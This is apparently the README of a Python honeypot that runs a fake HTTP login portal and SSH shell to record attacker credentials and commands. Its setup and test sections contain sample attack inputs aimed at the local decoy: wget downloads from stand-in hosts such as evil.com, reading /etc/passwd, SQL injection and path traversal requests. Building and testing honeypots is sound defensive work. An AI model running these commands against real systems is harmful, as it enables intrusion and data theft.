# 🍯 Network Honeypot - SSH/HTTP Decoy System

![Python](https://img.shields.io/badge/python-3.9+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Status](https://img.shields.io/badge/status-production--ready-success.svg)

## 📋 Project Overview

**Production-grade network deception system** that simulates vulnerable enterprise services (HTTP login portal + SSH server) to capture attacker credentials, commands, and payloads with **zero false positives**. Built for security research, threat intelligence collection, and studying adversary TTPs (Tactics, Techniques, and Procedures).

### ✨ Key Features

- **🎭 Dual Protocol Decoys**
  - HTTP fake login portal (Flask) on port 8080, answers like Apache
  - SSH server (Paramiko) on port 2222: weak passwords (e.g. `root/root`) "work" and drop the
    attacker into a fake Ubuntu shell with 40+ commands; every other password is rejected
  - One-line commands (`ssh host 'uname -a'`) are captured too
  
- **🔒 Enterprise-Grade Security**
  - Zero command execution (all responses pre-generated)
  - Bcrypt password hashing (never plaintext storage)
  - Thread-safe concurrent session handling
  - Session limits: 100 open sessions, 5 min idle timeout, 30 min maximum, per-IP rate limit
  - Graceful offline operation and clean shutdown (Ctrl+C closes every session)

- **📊 Comprehensive Telemetry**
  - UUID-based session tracking
  - Real-time credential harvesting
  - Command/payload classification
  - MITRE ATT&CK technique mapping
  - GeoIP enrichment (with offline fallback)

- **💾 SQLite Storage**
  - Normalized schema (sessions, auth_attempts, interactions, ip_intel)
  - WAL mode for concurrent read/write
  - Full-text attack pattern search

- **📈 Analytics Dashboard**
  - Live statistics (auto-refresh) and charts: 24 h timeline, attack types, top IPs/usernames/commands
  - Attack origins by country (GeoIP)
  - Session list (50 per page, sortable, HTTP/SSH filter) with shell replay
  - JSON API + JSONL / CSV / MISP exports for SIEM integration

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACKER / INTERNET                       │
└──────────┬──────────────────────┬───────────────────────────┘
           │                      │
           ▼                      ▼
    ┌────────────┐         ┌────────────┐
    │ HTTP Decoy │         │ SSH Decoy  │
    │ Port 8080  │         │ Port 2222  │
    │ (Flask)    │         │ (Paramiko) │
    └──────┬─────┘         └──────┬─────┘
           │                      │
           └──────────┬───────────┘
                      ▼
            ┌──────────────────┐
            │ Session Manager  │
            │ Event Tracking   │
            └────────┬─────────┘
                     ▼
            ┌──────────────────┐
            │ Attack Classifier│
            │ MITRE ATT&CK Map │
            └────────┬─────────┘
                     ▼
            ┌──────────────────┐
            │  IP Enrichment   │
            │  GeoIP2/MaxMind  │
            └────────┬─────────┘
                     ▼
            ┌──────────────────┐
            │ SQLite Database  │
            │   (WAL mode)     │
            └────────┬─────────┘
                     │
        ┌────────────┴────────────┐
        ▼                         ▼
┌──────────────┐        ┌──────────────┐
│  Dashboard   │        │     API      │
│ (Port 5000)  │        │  /api/stats  │
└──────────────┘        └──────────────┘
```

---

## 🚀 Quick Start

### Prerequisites

- **Python 3.11+** (3.9+ may work but untested)
- **pip** package manager
- **Git** (for cloning)

### Installation

```bash
# 1. Clone repository
git clone https://github.com/yourusername/honeypot.git
cd honeypot

# 2. Create virtual environment
python -m venv venv

# Windows:
venv\Scripts\activate

# Linux/Mac:
source venv/bin/activate

# 3. Install dependencies
pip install -r requirements.txt

# 4. Create configuration
copy .env.example .env
# (Linux/Mac: cp .env.example .env)

# Edit .env if needed (defaults work for localhost testing)
```

### Running the Honeypot

```bash
# Start both HTTP and SSH decoys
python -m app.main
```

**Expected Output:**
```
============================================================
🍯 Network Honeypot - SSH/HTTP Decoy System
============================================================
  • HTTP decoy:  http://0.0.0.0:8080
  • SSH decoy:   ssh -p 2222 root@0.0.0.0
  • Database:    /path/to/network-honeypot/data/honeypot.db
  • Limits:      100 sessions, idle 300s, max 1800s
============================================================
⚠️  Only deploy on networks you own or are authorized to monitor.
   Run it isolated (DMZ/VLAN) and block outgoing traffic (see README).
Press Ctrl+C to stop
============================================================
... INFO    honeypot.http: HTTP decoy listening on 0.0.0.0:8080 (fake Acme Corp login portal)
... INFO    honeypot.ssh: SSH decoy listening on 0.0.0.0:2222 (banner SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1, 14 weak passwords accepted)
```

Set `DASHBOARD_ENABLED=true` in `.env` to start the dashboard together with the decoys.
If a port is busy or a setting in `.env` is wrong, the program stops with a clear message.

### Testing the Installation

**Option 1: Manual Testing**

Open `http://localhost:8080` in a browser and try to log in (it always fails, but is recorded).

SSH in with a weak password and type some commands:
```bash
ssh root@localhost -p 2222
# Password: root      (any pair from SSH_ACCEPTED_CREDENTIALS works, e.g. admin/admin)
whoami
uname -a
wget http://evil.example/malware
exit
```

**Option 2: Automated tests (no honeypot needs to be running)**

```bash
python -m pytest tests -v        # 172 tests: every member's part
```

**Option 3: Full Attack Simulation (honeypot running)**

```bash
# 100 attacks: 50 HTTP + 50 SSH (brute force, weak-password shells, one-line commands)
python scripts/simulate_attacks.py
```

### Viewing Captured Data

**Start the Dashboard:**
```bash
# In a NEW terminal:
python -m app.dashboard.app
```

Open browser: `http://localhost:5000`
(On a Mac, port 5000 is taken by AirPlay Receiver: set `DASHBOARD_PORT=5050` in `.env`.)

**Export the data:**
```bash
python scripts/export_logs.py               # JSONL + CSV + MISP into data/exports/
python scripts/export_logs.py --format misp # just one format
```
The same exports are on the dashboard as download links.

**Query Database Directly:**
```bash
# View sessions
sqlite3 data/honeypot.db "SELECT * FROM sessions ORDER BY started_at DESC LIMIT 5;"

# View captured credentials (hashed)
sqlite3 data/honeypot.db "SELECT username, timestamp FROM auth_attempts ORDER BY timestamp DESC LIMIT 10;"

# View SSH commands with classification
sqlite3 data/honeypot.db "
SELECT command, command_classification, fake_output 
FROM interactions 
WHERE interaction_type='ssh_command' 
LIMIT 10;
"

# View attack statistics
sqlite3 data/honeypot.db "
SELECT 
    (SELECT COUNT(*) FROM sessions) as total_sessions,
    (SELECT COUNT(*) FROM auth_attempts) as credentials_captured,
    (SELECT COUNT(*) FROM interactions) as total_interactions;
"
```

---

## 📂 Project Structure

```
network-honeypot/
├── app/
│   ├── main.py                      # Member 1 - start-up, reaper, shutdown
│   ├── core/
│   │   ├── config.py                # Member 1 - settings from .env + validation
│   │   ├── session.py               # Member 1 - shared sessions, limits, timeouts
│   │   ├── webserver.py             # Member 1 - stoppable web server helper
│   │   └── classifiers.py           # Member 5 - attack classification + MITRE ATT&CK
│   ├── decoy_http/
│   │   └── server.py                # Member 2 - fake login portal
│   ├── decoy_ssh/
│   │   ├── server.py                # Member 3 - Paramiko SSH server
│   │   ├── shell.py                 # Member 3 - fake shell (40+ commands)
│   │   └── banners.py               # Member 3 - SSH banners / MOTD
│   ├── storage/
│   │   ├── database.py              # Member 4 - SQLite (WAL + lock)
│   │   ├── models.py                # Member 4 - table record types
│   │   └── exporters.py             # Member 6 - JSONL / CSV / MISP
│   ├── enrichment/
│   │   └── ip_lookup.py             # Member 5 - GeoIP + offline fallback
│   └── dashboard/
│       ├── app.py                   # Member 6 - dashboard + JSON API
│       └── templates/               # base, overview, sessions, session detail
├── scripts/
│   ├── simulate_attacks.py          # Member 7 - 100 simulated attacks
│   ├── export_logs.py               # Member 6 - export from the command line
│   ├── setup_geoip.sh               # Member 7 - download MaxMind databases
│   └── test_honeypot.py             # Member 7 - quick HTTP smoke test
├── tests/                           # Member 7 - pytest suite (172 tests)
├── docs/
├── data/                            # Runtime data (git-ignored): db, logs, key, exports
├── install.py                       # One-command setup
├── requirements.txt
├── .env.example
├── CHANGES.md                       # What was fixed, per team member
└── README.md
```

---

## 🔧 Configuration

Copy `.env.example` to `.env` and edit it. Every setting is explained in that file. The most important ones:

| Setting | Default | Meaning |
|---|---|---|
| `HTTP_PORT` / `SSH_PORT` | 8080 / 2222 | Decoy ports |
| `SSH_ACCEPTED_CREDENTIALS` | 14 weak pairs | `user:pass` pairs that open the fake shell |
| `MAX_CONCURRENT_SESSIONS` | 100 | Open sessions allowed (HTTP + SSH together) |
| `SESSION_IDLE_TIMEOUT_SECONDS` | 300 | SSH attacker logged out after 5 min without typing |
| `SESSION_MAX_DURATION_SECONDS` | 1800 | Hard limit of 30 min per session |
| `RATE_LIMIT_PER_IP` | 120 per 60 s | Extra connections from one IP are not logged |
| `MAX_OUTPUT_BYTES` | 4096 | Longest fake command output |
| `DASHBOARD_ENABLED` | false | Start the dashboard with `app.main` |
| `DATABASE_PATH` | data/honeypot.db | Relative paths are inside the project folder |

---

## 🧪 Attack Simulation Examples

### HTTP Attacks

```bash
# SQL Injection
curl "http://localhost:8080/search?id=1' OR '1'='1"

# Path Traversal
curl "http://localhost:8080/../etc/passwd"

# WordPress Scan
curl "http://localhost:8080/wp-admin"

# Credential Stuffing
curl -X POST http://localhost:8080/login \
  -d "username=admin&password=admin123" \
  -H "User-Agent: HackerBot/1.0"
```

### SSH Attacks

```bash
# Brute force: wrong passwords are rejected (and logged)
ssh admin@localhost -p 2222
# Try: password, letmein ...

# Weak password: you get the fake shell
ssh root@localhost -p 2222       # password: root

# One-line command, like bots send
ssh root@localhost -p 2222 'uname -a; nproc'
# Commands to test:
whoami
uname -a
cat /etc/passwd
wget http://evil.com/malware
```

---

## 📊 Database Schema

### Core Tables

**sessions** - Connection metadata
- `session_id` (UUID), `source_ip`, `source_port`, `dest_port`
- `protocol` ('http' | 'ssh'), `started_at`, `ended_at`, `duration_seconds`
- `user_agent`, `ssh_client_version`, `total_interactions`

**auth_attempts** - Credential capture
- `attempt_id`, `session_id`, `timestamp`
- `username`, `password_hash` (bcrypt), `auth_method` ('password' | 'form' | 'http_basic' | 'publickey:…'), `success` (1 = weak SSH password let the attacker in)

**interactions** - Commands & HTTP payloads
- `interaction_id`, `session_id`, `timestamp`, `interaction_type`
- SSH: `command`, `command_classification`, `fake_output`
- HTTP: `http_method`, `http_path`, `http_query_params`, `http_body`, `attack_signature`

**ip_intel** - Enrichment cache
- `ip_address`, `last_updated`, `country_code`, `country_name`
- `city`, `latitude`, `longitude`, `asn`, `asn_org`
- `total_sessions`, `first_seen`, `last_seen`

See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for complete schema and indexes.

---

## 🛡️ Security & Deployment

### ⚠️ CRITICAL WARNINGS

1. **Authorized Use Only**
   - Deploy only on networks you own or have written authorization to monitor
   - Unauthorized honeypot deployment may violate wiretapping laws
   - Check local regulations (GDPR, CCPA, etc.)

2. **Isolated Environment**
   - Run in DMZ or isolated VLAN
   - No access to production systems
   - Firewall rules: inbound only on decoy ports, block all outbound

3. **Credential Handling**
   - Passwords stored as bcrypt hashes (never plaintext)
   - Attackers may reuse victim passwords - handle with care
   - Implement data retention policies (30/60/90 days)

4. **Network Isolation Example**
   ```bash
   # Firewall rules (iptables example):
   iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
   iptables -A INPUT -p tcp --dport 2222 -j ACCEPT
   iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
   iptables -A OUTPUT -j DROP  # Block all outbound
   ```

5. **Non-Privileged Ports**
   - Default: 8080 (HTTP), 2222 (SSH) - no root required
   - To bind to 80/22: use `setcap` or Docker

### Safe Deployment

```bash
# Create dedicated user
sudo useradd -r -s /bin/false honeypot
sudo chown -R honeypot:honeypot /opt/honeypot

# Run as non-root
sudo -u honeypot python -m app.main

# Optional: Bind to privileged ports with capabilities
sudo setcap 'cap_net_bind_service=+ep' $(which python3)
```

### Docker Deployment (Recommended)

```dockerfile
# Dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 8080 2222 5000
CMD ["python", "-m", "app.main"]
```

```bash
docker build -t honeypot .
docker run -d -p 8080:8080 -p 2222:2222 -v $(pwd)/data:/app/data honeypot
```

---

## 📈 Threat Intelligence Use Cases

### 1. Botnet Tracking
Monitor credential dictionaries and command sequences to identify bot families (Mirai, Gafgyt, etc.)

### 2. Zero-Day Discovery
Capture novel exploit attempts targeting unknown vulnerabilities

### 3. TTP Analysis
Map attacker behavior to MITRE ATT&CK framework for threat modeling

### 4. Early Warning System
Detect reconnaissance activity before production systems are targeted

### 5. Threat Feed Generation
Export attack data to SIEM/SOAR platforms for correlation

---

## 🤝 Contributing

Contributions welcome! Areas for enhancement:

- **Additional Decoys**: FTP, Telnet, RDP, SMTP
- **Advanced Enrichment**: AbuseIPDB, GreyNoise, Shodan integration
- **Machine Learning**: Behavioral clustering, anomaly detection
- **Threat Feeds**: MISP event generation, STIX/TAXII export
- **Visualization**: Real-time attack maps, D3.js charts

---

## 📄 License

MIT License - See LICENSE file

**Disclaimer**: This tool is for authorized security research and educational purposes only. Users are responsible for ensuring compliance with applicable laws and regulations.

---

## 📚 Documentation

- **[QUICKSTART.md](QUICKSTART.md)** - Get running in 5 minutes
- **[PLAN.md](PLAN.md)** - 4-phase implementation roadmap
- **[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)** - System design and database schema
- **[docs/TEAM_WALKTHROUGH.md](docs/TEAM_WALKTHROUGH.md)** - Complete code walkthrough

---

## 🙏 Acknowledgments

- **SANS Internet Storm Center** - Honeypot research and best practices
- **MITRE ATT&CK** - Adversarial TTP framework
- **Cowrie** - SSH/Telnet honeypot inspiration
- **MaxMind GeoLite2** - Free geolocation database
- **Paramiko** - Python SSH implementation

---

## 📞 Support & Contact

- **Issues**: [GitHub Issues](https://github.com/yourusername/honeypot/issues)
- **Questions**: See documentation in `docs/` folder
- **Security**: Report vulnerabilities responsibly via GitHub Security tab

---

## 🎯 Project Status

**Current Version**: 1.0.0 (All 4 phases complete)

✅ Phase 1: HTTP Decoy & Storage  
✅ Phase 2: SSH Decoy & Interactive Shell  
✅ Phase 3: IP Enrichment & Classification  
✅ Phase 4: Analytics Dashboard & API  

**Tested On**:
- Windows 11 (Python 3.11)
- Ubuntu 22.04 LTS (Python 3.11)
- macOS Ventura (Python 3.11)

---

<div align="center">

**⚠️ Use Responsibly | 🔒 Handle Captured Data Securely | 📊 Share Threat Intel with Community**

Made with ❤️ for the security research community

</div>
